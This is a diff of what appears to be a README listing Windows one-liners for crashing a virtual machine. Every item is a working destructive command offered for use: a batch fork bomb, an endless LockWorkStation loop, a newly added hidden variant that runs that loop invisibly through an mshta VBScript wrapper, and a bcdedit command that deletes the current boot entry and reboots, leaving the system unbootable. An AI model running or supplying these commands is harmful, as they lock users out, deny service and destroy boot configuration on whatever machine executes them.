@@ -10,13 +10,18 @@ To crash the VM, you must execute one of them in the "Run" window or in the comm
 cmd /c echo %0^|%0>1.bat&1.bat
 ```
 
-2. Infinite blocking of the windows user + pseudo fork bomb. Unclosable, only reboot helps.
+2. Infinite blocking the windows user + pseudo fork bomb. Unclosable, only reboot helps.
 
 ```batch
 cmd /k for /l %x in (1, 1, 9999999) do (start cmd /k rundll32 user32,LockWorkStation)
 ```
 
-3. Delete windows from bootloader and reboot (the system will no longer be able to boot. Run from cmd with admin privileges (RMB on cmd -> Run as admin).
+3. Hidden infinite blocking the windows user (not a forkbomb). Unclosable, Perfect way to block VM, only reboot helps.
+```batch
+cmd /c mshta vbscript:(CreateObject("WScript.Shell").Run("cmd /k for /l %x in (1, 1, 999999) do rundll32 user32,LockWorkStation """,0))(Window.Close)
+```
+
+4. Delete windows from bootloader and reboot (the system will no longer be able to boot. Run from cmd started as admin (RMB on cmd -> Run as admin).
 
 ```batch
 cmd /k bcdedit /delete {current}&wmic os primary=1 reboot
